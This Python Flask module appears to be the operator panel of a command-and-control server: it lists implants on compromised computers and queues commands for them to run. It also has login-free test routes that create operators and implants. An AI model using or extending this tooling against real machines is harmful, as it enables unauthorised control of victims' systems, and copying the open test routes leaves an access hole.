from flask import (
    Blueprint, flash, g, jsonify, make_response,
    redirect, render_template, request, Response, url_for
)
from werkzeug.exceptions import abort

from datetime import datetime
import json
import random

from .auth import login_required
from .db import db
from .models import Command, Implant, Operator

# TODO: Delete later, for testing only
from pprint import pprint
import uuid


bp = Blueprint('operator', __name__)


@bp.route('/')
@login_required
def index():
    operators = Operator.query.all()
    return render_template('operator/index.html', operators=operators)


@bp.route('/implant/<id>', methods=['GET'])
@login_required
def get_implant(id):

    if not id:
        error = "Implant id is required."
        flash(error)
        return redirect(url_for('operator.list_all_implants'))

    implant = Implant.query.filter_by(id=id).first()
    commands = Command.query.filter_by(computer_guid=implant.computer_guid)

    if not implant:
        error = f"No implant with id {id}."
        flash(error)
        return redirect(url_for('operator.list_all_implants'))

    return render_template('operator/implant.html', implant=implant, commands=commands)


@bp.route('/implants', methods=['GET'])
@login_required
def list_all_implants():

    implants = Implant.query.all()
    # TODO: add custom message for when there are no implants
    # (instead of showing an empty list)

    return render_template('operator/implants.html', implants=implants)


@bp.route('/implant/<id>/sendCommand', methods=['POST'])
@login_required
def store_command_for_implant(id):

    operator = g.operator
    implant = Implant.query.filter_by(id=id).first()

    if not implant:
        error = "No implant of that id."
        flash(error)
        return redirect(url_for('operator.list_all_implants'))

    command_type = request.form['command_type']
    command_text = request.form['command_text']
    computer_guid = implant.computer_guid
    operator_id = operator.id

    errors = []

    if not command_type:
        errors.append('Command type is required.')
    if not command_text:
        errors.append('Command text is required.')

    if errors:
        for error in errors:
            flash(error)
        return redirect(url_for('operator.get_implant', id=id))

    # TODO: Get length of timestamp, update database
    time_issued = datetime.now()
    status = "not_taken_by_implant"
    command_result = None

    command = Command(
        command_type=command_type,
        command_text=command_text,
        computer_guid=computer_guid,
        operator_id=operator_id,
        time_issued=time_issued,
        status=status,
        command_result=command_result
    )

    db.session.add(command)
    db.session.commit()

    response = "Command stored."
    flash(response)
    return redirect(url_for('operator.get_implant', id=id))


# For testing only, delete later
@bp.route('/make-test-implant', methods=['GET'])
def make_test_implant():
    id = None

    try:
        implant = Implant(
            computer_name="test_computer_name",
            computer_user="test_computer_user",
            computer_privileges="test_computer_privileges",
            connecting_ip_address="test_connecting_ip_address",
            last_seen="test_last_seen",
            expected_check_in="test_expected_check_in",
            computer_guid=str(uuid.uuid4()),
            session_key="test_session_key",
            sleep="test_sleep",
            jitter="test_jitter",
            first_seen="test_first_seen"
        )

        db.session.add(implant)
        db.session.commit()

        # Source: https://stackoverflow.com/questions/1316952/sqlalchemy-flush-and-get-inserted-id
        db.session.flush()
        db.session.refresh(implant, attribute_names=[])
        id = implant.id
    except Exception as e:
        print(f"Error in make_fake_implant: {e}")
        response = {"error": str(e)}
        return make_response(jsonify(response), 500)

    response = {
        "id": id
    }

    response = jsonify(response)

    return make_response(response, 200)


# For testing only, delete later
@bp.route('/make-test-operator', methods=['GET'])
def make_test_operator():
    id = None

    try:
        operator = Operator(
            username=f"test_username_{random.randint(1,1000)}",
            password_hash="test_password_hash"
        )

        db.session.add(operator)
        db.session.commit()

        # Source: https://stackoverflow.com/questions/1316952/sqlalchemy-flush-and-get-inserted-id
        db.session.flush()
        db.session.refresh(operator, attribute_names=[])
        id = operator.id
    except Exception as e:
        print(f"Error in make_fake_operator: {e}")
        response = {"error": str(e)}
        return make_response(jsonify(response), 500)

    response = {
        "id": id
    }

    response = jsonify(response)

    return make_response(response, 200)
